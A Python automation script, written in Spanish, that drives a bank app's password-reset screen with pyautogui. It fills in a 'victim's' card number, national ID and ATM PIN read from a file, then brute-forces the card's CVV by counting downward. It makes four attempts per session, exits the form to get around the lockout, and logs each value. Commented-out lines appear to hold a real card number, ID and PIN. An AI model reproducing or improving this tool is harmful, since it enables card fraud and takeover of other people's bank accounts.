import pyautogui as p
import time 
from io import open
import subprocess

#block
registro = open("registro.txt","a")
registro.write("Comenzando")
registro.write("\n")

arhivo_user = open("user.txt","r")
textoUser = arhivo_user.readlines()
arhivo_user.close()

victima_tar = str(textoUser[0]).rstrip()
victima_dni = str(textoUser[1]).rstrip()
victima_pasw = str(textoUser[2]).rstrip()


#victima_tar = "4919148311467715"
#victima_dni = "77470040"
#victima_pasw = "1898"

class Coordenadas:
	acceder = 278,916
	iniciarSesion =278,204
	m1_numeroDocumento = 269,328
	m1_continuar = 282,324
	m1_olvidecontrasena = 273,197

	m2_TarjetaConDatosImpresos = 32,390
	m2_continuar = 289,604

	m3_tipoDocumento = 461,306
	m3_marcarDni = 49,408
	m3_form_DNI = 222,366
	m3_form_Tarjeta = 277,425
	m3_form_ATM =  253,612
	m3_form_ATM_VerContrasena =  526,611

	m3_form_CVV = 312,523
	m3_form_CVV_VerContrasena  = 524,515

	m3_form_continuar = 284,721
	m3_form_entendido = 277,985

	m4_SalirEscape = 538,77
	m4_SalirBoton = 275,955



def ingresarAOlvidarContrasena():
	time.sleep(1)
	p.click(Coordenadas.iniciarSesion)
	time.sleep(2)
	p.click(Coordenadas.m1_numeroDocumento) # click en numero de documento
	time.sleep(0.4)
	p.typewrite("12345678", interval=0.02)
	time.sleep(0.2)
	p.click(Coordenadas.m1_continuar) # click en continuar
	time.sleep(0.3)
	p.click(Coordenadas.m1_olvidecontrasena) # click en olvide mi contraseña


def llenarFormulario(dni,tarjeta,atm):
	p.click(Coordenadas.m3_tipoDocumento)
	time.sleep(0.4)
	p.click(Coordenadas.m3_marcarDni)
	time.sleep(0.4)
	#LLenando el DNI
	p.click(Coordenadas.m3_form_DNI)
	p.time.sleep(0.2)
	p.typewrite(dni, interval=0.02)
	#LLenando la tarjeta
	p.click(Coordenadas.m3_form_Tarjeta)
	p.time.sleep(0.2)
	p.typewrite(tarjeta, interval=0.04)
	#LLenando el ATM
	p.click(Coordenadas.m3_form_ATM)
	p.click(Coordenadas.m3_form_ATM_VerContrasena)
	p.time.sleep(0.2)
	p.typewrite(atm, interval=0.02)

def salirDeFormulario():
	p.click(Coordenadas.m4_SalirEscape)
	time.sleep(0.5)
	p.click(Coordenadas.m4_SalirBoton)
	time.sleep(3)

def antiguo():
	contador = 0 

	while contador != 4:

		#time.sleep(0.2)

		p.click(204,152) # dar click en codigo de seguridad

		if inicio < 100:
			p.typewrite("0")
			p.typewrite(str(inicio), interval= 0.02)

			time.sleep(0.1)
		else:
			p.typewrite(str(inicio), interval= 0.02)
			time.sleep(0.1)

		time.sleep(0.2)
		print('Intentando con: '+str(inicio))
		p.click(228,449) # click en continuar
		p.click(228,449) # click en continuar

		#Analizando
		while True:
			negro = p.pixelMatchesColor(389,725,(17,17,17))
			time.sleep(0.1)

			if (negro is True):
				print("!negro!")
				time.sleep(1)
				p.click(268,157) #vacio

				time.sleep(0.4)
				#Borrar el codigo anterior
				p.click(268,157) # lugar del cvv
				time.sleep(1) # espera el teclado

				p.click(420,889)# borrar click
				time.sleep(0.3)
				p.click(420,889)# borrar click
				time.sleep(0.3)
				p.click(420,889)# borrar click
				time.sleep(0.2)

				time.sleep(0.4)
				break


		#time.sleep(3)
		#print('finish')
		#input()

		inicio -= 1
		contador += 1

		registro = open("registro.txt","a")
		registro.write(str(inicio)) # escribir en el block
		registro.write("\n")
		registro.close()


if __name__ == '__main__':

	#Abrir variables
	arhivo_user = open("user.txt","r")
	textoUser = arhivo_user.readlines()
	arhivo_user.close()

	victima_tar = textoUser[0].rstrip()
	victima_dni = textoUser[1].rstrip()
	victima_pasw = textoUser[2].rstrip()

	victima_cvv = input('cvv_ > ')
	victima_cvv = int(victima_cvv)
	#victima_cvv = 200
	
	fin_cvv = 100


	print("*****************")

	#inicio = int(input("Desde que número desea comenzar?:  "))

	#Veces que intenta:
	#intentos = 3
	#intentos = int(input("Intentos?"))

	print("*****************")
	print("Presione 'Enter' para continuar")
	#input()


	print(":D")
	print("\n")
	print("Corriendo Bot")
	print("3")
	time.sleep(0.5)
	print("2")
	time.sleep(0.5)
	print("1")
	print ('\a')
	
	while victima_cvv > fin_cvv:
		time.sleep(0.5)
		ingresarAOlvidarContrasena()
		time.sleep(1.5)

		#Clickeando en restablecer contrasena
		p.click(Coordenadas.m2_TarjetaConDatosImpresos) 
		time.sleep(0.3)
		p.click(Coordenadas.m2_continuar)
		time.sleep(0.5)

		#Rellenando el formulario
		llenarFormulario(victima_dni,victima_tar,victima_pasw)

		#Declarando para ver el cvv 1 vez
		vercvv = True
		Intentos_cvv = 0

		#input('Continuar? > Enter ') # la pausa

		while Intentos_cvv < 4:
			#Llenando el CVV
			time.sleep(0.5)
			p.click(Coordenadas.m3_form_CVV)
			if vercvv:
				p.click(Coordenadas.m3_form_CVV_VerContrasena)
				vercvv = False
			time.sleep(0.3)

			p.press('backspace')
			p.press('backspace')
			p.press('backspace')
			#time.sleep(0.1)
			#por si son bajos de 100
			if victima_cvv < 100:
				p.typewrite("0")
				p.typewrite(str(victima_cvv))
				time.sleep(0.1)
				#print("Tipeando") #######################
			else:
				p.typewrite(str(victima_cvv))
				time.sleep(0.1)
				#print("Tipeando") #########################

			p.click(Coordenadas.m3_form_continuar) # click en continuar
			print(f'Intentando cvv: {victima_cvv}')
			time.sleep(0.5)

			pixelAzulContinuar = False

			while pixelAzulContinuar is False:
				time.sleep(0.1)
				pixelAzulContinuar = p.pixelMatchesColor(329,983,(35,122,186))
				#print(f'Pixel azul {pixelAzulContinuar}')


			time.sleep(0.3)
			p.click(Coordenadas.m3_form_entendido)

			Intentos_cvv += 1 #Sumando para el error
			victima_cvv -= 1 #Restando el cvv

		print("Terminado los 4 intentos")
		time.sleep(1)
		# Ruta al script que deseas ejecutar
		#ruta_script = "abrirNavegador.py"

		#try:
		#    subprocess.run(["python", ruta_script], check=True)
		#except subprocess.CalledProcessError as e:
		#    print(f"Error al ejecutar el script: {e}")

		salirDeFormulario()

